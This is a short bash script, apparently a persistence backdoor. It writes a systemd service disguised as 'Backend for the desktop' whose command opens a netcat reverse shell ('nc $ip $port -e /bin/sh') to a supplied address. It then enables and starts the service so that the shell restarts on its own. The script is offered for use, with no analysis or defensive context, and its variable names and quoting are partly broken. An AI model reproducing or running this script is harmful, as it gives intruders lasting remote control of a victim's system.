#!/bin/bash
ip="$IP"
Port="$Port"
echo "[Unit]
Description=Backend for the desktop

[Service]
Type=simple
ExecStart=/bin/bash -c 'nc $ip $port -e /bin/sh'
Restart=always

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/Desktop.service"
systemctl daemon-reload
systemctl enable Desktop.service
systemctl start Desktop.service"

